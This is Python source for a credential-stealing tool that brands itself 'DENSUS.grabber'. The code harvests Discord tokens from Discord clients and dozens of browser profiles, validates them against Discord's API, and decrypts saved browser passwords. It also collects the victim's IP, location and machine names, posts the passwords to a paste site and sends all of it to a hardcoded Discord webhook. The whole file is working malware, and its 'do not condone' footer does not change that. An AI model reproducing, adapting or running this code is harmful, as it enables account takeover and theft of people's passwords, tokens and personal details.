import os
import requests
import json
import re
import base64
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
import sqlite3
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta

APPDATA = os.getenv("localappdata")
ROAMING = os.getenv("appdata")
TEMP = os.getenv('TEMP')

webhook = "https://discord.com/api/webhooks/1151887833376759928/9o0GwtSbKaV282iKM2LCt3yVbpm0z93pXijbhVr_nUQOOGNA03cOjQZ9LUMay_brd5kC"

#COMPUTER

user_name=os.getenv("UserName")
computer_name=os.getenv("COMPUTERNAME")

data=requests.get("https://ipinfo.io/json").text
user_data = json.loads(data)
ip = user_data['ip']
city = user_data['city']
region = user_data['region']
country = user_data['country']
org = user_data['org']

#DISCORD

baseurl = "https://discord.com/api/v9/users/@me"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

tokens_sent = []
tokens = []
ids = []
usernames = []
displays = []
nitros = []
emails = []
phones = []
avatars = []

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def grabTokens():
    paths = {
        'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': APPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': APPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': APPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': APPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': APPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': APPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': APPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': APPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': APPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': APPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': APPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': APPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': APPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': APPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': APPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Chrome6': APPDATA + '\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\',
        'Chrome7': APPDATA + '\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\',
        'Chrome8': APPDATA + '\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\',
        'Chrome9': APPDATA + '\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\',
        'Chrome10': APPDATA + '\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\',
        'Chrome11': APPDATA + '\\Google\\Chrome\\User Data\\Profile 11\\Local Storage\\leveldb\\',
        'Chrome12': APPDATA + '\\Google\\Chrome\\User Data\\Profile 12\\Local Storage\\leveldb\\',
        'Chrome13': APPDATA + '\\Google\\Chrome\\User Data\\Profile 13\\Local Storage\\leveldb\\',
        'Chrome14': APPDATA + '\\Google\\Chrome\\User Data\\Profile 14\\Local Storage\\leveldb\\',
        'Chrome15': APPDATA + '\\Google\\Chrome\\User Data\\Profile 15\\Local Storage\\leveldb\\',
        'Chrome16': APPDATA + '\\Google\\Chrome\\User Data\\Profile 16\\Local Storage\\leveldb\\',
        'Chrome17': APPDATA + '\\Google\\Chrome\\User Data\\Profile 17\\Local Storage\\leveldb\\',
        'Chrome18': APPDATA + '\\Google\\Chrome\\User Data\\Profile 18\\Local Storage\\leveldb\\',
        'Chrome19': APPDATA + '\\Google\\Chrome\\User Data\\Profile 19\\Local Storage\\leveldb\\',
        'Chrome20': APPDATA + '\\Google\\Chrome\\User Data\\Profile 20\\Local Storage\\leveldb\\',
        'Chrome21': APPDATA + '\\Google\\Chrome\\User Data\\Profile 21\\Local Storage\\leveldb\\',
        'Chrome22': APPDATA + '\\Google\\Chrome\\User Data\\Profile 22\\Local Storage\\leveldb\\',
        'Chrome23': APPDATA + '\\Google\\Chrome\\User Data\\Profile 23\\Local Storage\\leveldb\\',
        'Chrome24': APPDATA + '\\Google\\Chrome\\User Data\\Profile 24\\Local Storage\\leveldb\\',
        'Chrome25': APPDATA + '\\Google\\Chrome\\User Data\\Profile 25\\Local Storage\\leveldb\\',
        'Chrome26': APPDATA + '\\Google\\Chrome\\User Data\\Profile 26\\Local Storage\\leveldb\\',
        'Chrome27': APPDATA + '\\Google\\Chrome\\User Data\\Profile 27\\Local Storage\\leveldb\\',
        'Chrome28': APPDATA + '\\Google\\Chrome\\User Data\\Profile 28\\Local Storage\\leveldb\\',
        'Chrome29': APPDATA + '\\Google\\Chrome\\User Data\\Profile 29\\Local Storage\\leveldb\\',
        'Chrome30': APPDATA + '\\Google\\Chrome\\User Data\\Profile 30\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': APPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': APPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': APPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': APPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': APPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': APPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(ROAMING + f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypted_regex, line):
                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(ROAMING + f'\\{disc}\\Local State'))
                            r = requests.get(baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})  
                            if r.status_code == 200:
                                print(r.text)
                                print("CODE WORKING")
                                uid = r.json()['id']
                                user = r.json()['username']
                                discriminator = r.json()['discriminator']
                                full_user = f'{user}#{discriminator}'
                                display = r.json()['global_name']
                                if r.json()['premium_type'] == 0:
                                    nitro_type = 'No Nitro'
                                elif r.json()['premium_type'] == 1:
                                    nitro_type = 'Nitro Basic'
                                elif r.json()['premium_type'] == 2:
                                    nitro_type = 'Nitro Boost'
                                else:
                                    nitro_type = 'No Nitro'
                                email = r.json()['email']
                                phone = r.json()['phone']
                                avatar_id = r.json()['avatar']
                                if not avatar_id == None:
                                    avatar = f'https://cdn.discordapp.com/avatars/{uid}/{avatar_id}.png'
                                else:
                                    avatar = 'https://discord.com/assets/3c6ccb83716d1e4fb91d3082f6b21d77.png'
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
                                    usernames.append(full_user)
                                    displays.append(display)
                                    nitros.append(nitro_type)
                                    emails.append(email)
                                    phones.append(phone)
                                    avatars.append(avatar)
                            else:
                                print("CODE NOT WORKING")
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            print("CODE WORKING")
                            uid = r.json()['id']
                            user = r.json()['username']
                            discriminator = r.json()['discriminator']
                            full_user = f'{user}#{discriminator}'
                            display = r.json()['global_name']
                            if r.json()['premium_type'] == 0:
                                nitro_type = 'No Nitro'
                            elif r.json()['premium_type'] == 1:
                                nitro_type = 'Nitro Basic'
                            elif r.json()['premium_type'] == 2:
                                nitro_type = 'Nitro Boost'
                            email = r.json()['email']
                            phone = r.json()['phone']
                            avatar_id = r.json()['avatar']
                            if not avatar_id == None:
                                avatar = f'https://cdn.discordapp.com/avatars/{uid}/{avatar_id}.png'
                            else:
                                avatar = 'https://discord.com/assets/3c6ccb83716d1e4fb91d3082f6b21d77.png'
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
                                usernames.append(full_user)
                                displays.append(display)
                                nitros.append(nitro_type)
                                emails.append(email)
                                phones.append(phone)
                                avatars.append(avatar)
                        else:
                            print("CODE NOT WORKING")

    if os.path.exists(ROAMING + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(ROAMING + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            print("CODE WORKING")
                            uid = r.json()['id']
                            user = r.json()['username']
                            discriminator = r.json()['discriminator']
                            full_user = f'{user}#{discriminator}'
                            display = r.json()['global_name']
                            if r.json()['premium_type'] == 0:
                                nitro_type = 'No Nitro'
                            elif r.json()['premium_type'] == 1:
                                nitro_type = 'Nitro Basic'
                            elif r.json()['premium_type'] == 2:
                                nitro_type = 'Nitro Boost'
                            email = r.json()['email']
                            phone = r.json()['phone']
                            avatar_id = r.json()['avatar']
                            if not avatar_id == None:
                                avatar = f'https://cdn.discordapp.com/avatars/{uid}/{avatar_id}.png'
                            else:
                                avatar = 'https://discord.com/assets/3c6ccb83716d1e4fb91d3082f6b21d77.png'
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
                                usernames.append(full_user)
                                displays.append(display)
                                nitros.append(nitro_type)
                                emails.append(email)
                                phones.append(phone)
                                avatars.append(avatar)
                        else:
                            print("CODE NOT WORKING")

#PASSWORDS

all_works = []
passwords_found = 0
password_info = ""
password_data = ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(path_thing):
    local_state_path = os.path.join(path_thing, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return

def split_text(text, character, split_count):
    parts = text.split(character)
    result = []

    for i in range(0, len(parts), split_count):
        chunk = character.join(parts[i:i+split_count])
        result.append(chunk)

    return result

def grabPass():
    passwords_found = 0
    passwords_things = ""
    pass_paths = {
            'Chrome': APPDATA + '\\Google\\Chrome\\User Data\\',
            'Microsoft Edge': APPDATA + '\\Microsoft\\Edge\\User Data\\',
            'Uran': APPDATA + '\\uCozMedia\\Uran\\User Data\\',
            'Yandex': APPDATA + '\\Yandex\\YandexBrowser\\User Data\\',
            'Brave': APPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\',
            'Iridium': APPDATA + '\\Iridium\\User Data\\'}
    for name, path in pass_paths.items():
        work_name = name.replace(" ", "")
        if not os.path.exists(path):
            print(f'{name}: PATH DOESNT EXIST')
            continue
        key = get_encryption_key(path)

        db_path = os.path.join(path, "default", "Login Data")
        
        filename = f"{work_name}_DATABASE.db"
        shutil.copyfile(db_path, filename)
        work_thing = f"{work_name}_passwords.txt"
        all_works.append(work_thing)
        output_file = open(os.path.join(TEMP, f"{work_name}_passwords.txt"), "w")
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                passwords_found += 1
                output_file.write(f"Origin URL: {origin_url}\n")
                output_file.write(f"Action URL: {action_url}\n")
                output_file.write(f"Username: {username}\n")
                output_file.write(f"Password: {password}\n")
                passwords_things += f"Origin URL: {origin_url}\n"
                passwords_things += f"Action URL: {action_url}\n"
                passwords_things += f"Username: {username}\n"
                passwords_things += f"Password: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                    output_file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                output_file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
                output_file.write("="*50 + "\n")
                passwords_things += "="*50 + "\n"
        cursor.close()
        db.close()
        output_file.close()
        try:
            os.remove(filename)
        except:
            pass
    passwords_things += f'|||{passwords_found}'
    return passwords_things

#EXECUTION

origin_url = 'https://ctxt.io/new'
passwords_url = ''

if __name__ == "__main__":
    grabTokens()
    pass_function = grabPass()
    if pass_function:
        password_data = pass_function.split('|||')
        password_info = password_data[0]
        passwords_found = password_data[1]
        origin_data = {
            'content': password_info,
            'ttl': '1d'
        }
        response = requests.post(url=origin_url, data=origin_data)
        print(response.url)
        passwords_url = response.url

print(password_info)

discord_webhook = DiscordWebhook(url=webhook, username="DENSUS.grabber", content="@everyone", avatar_url='https://densus2.netlify.app/densus_logo.png')

info1 = DiscordEmbed(title="DENSUS.grabber", color="8B0000")
info1.set_thumbnail(url="https://densus2.netlify.app/densus_logo.png")
info1.set_footer(text="Malware From DENSUS.co | Founded By Pixelated.")

info1.add_embed_field(name="`Computer Name:`", value=f'**{computer_name}**')
info1.add_embed_field(name="`Computer Username:`", value=f'**{user_name}**')

info1.add_embed_field(name="`IP Address:`", value=f'**{ip}**')
info1.add_embed_field(name="`Country:`", value=f':flag_{country.lower()}:')
info1.add_embed_field(name="`City:`", value=f'**{city}**')
info1.add_embed_field(name="`Region:`", value=f'**{region}**')
info1.add_embed_field(name="`Organisation:`", value=f'**{org}**')

discord_webhook.add_embed(info1)

for token, an_id, username, display, nitro, email, avatar, phone in zip(tokens, ids, usernames, displays, nitros, emails, avatars, phones):
    print(f'TOKEN: {token}')
    print(f'ID: {an_id}')
    print(f'USERNAME: {username}')
    print(f'DISPLAY NAME: {display}')
    print(f'NITRO: {nitro}')
    print(f'EMAIL: {email}')
    print(f'PHONE NUMBER: {phone}')
    print(f'AVATAR URL: {avatar}')
    info2 = DiscordEmbed(title=username, color="8B0000")
    info2.set_thumbnail(url=avatar)
    info2.set_footer(text="I do **NOT** condone any malicious acts using any of our products, use it at you're own risk.")

    info2.add_embed_field(name="`Display Name:`", value=f'**{display}**')
    info2.add_embed_field(name="`User ID:`", value=f'**{an_id}**', inline=False)
    info2.add_embed_field(name="`Email:`", value=f'**{email}**')
    info2.add_embed_field(name="`Phone Number:`", value=f'**{phone}**')
    info2.add_embed_field(name="`Nitro Subscription:`", value=f'**{nitro}**', inline=False)
    info2.add_embed_field(name="`Token:`", value=f'**{token}**', inline=False)

    discord_webhook.add_embed(info2)


browser_amount = len(all_works)
info3 = DiscordEmbed(title='Passwords Found', color="8B0000")
info3.set_footer(text="Passwords URL gets destroyed every 24H, make sure to save the information before its too late.")

info3.add_embed_field(name="`Browsers Found:`", value=f'**{browser_amount}**', inline=True)
info3.add_embed_field(name="`Password Amount:`", value=f'**{passwords_found}**', inline=True)

info3.add_embed_field(name="`Passwords URL:`", value=f'**{passwords_url}**', inline=True)

discord_webhook.add_embed(info3)

response = discord_webhook.execute()
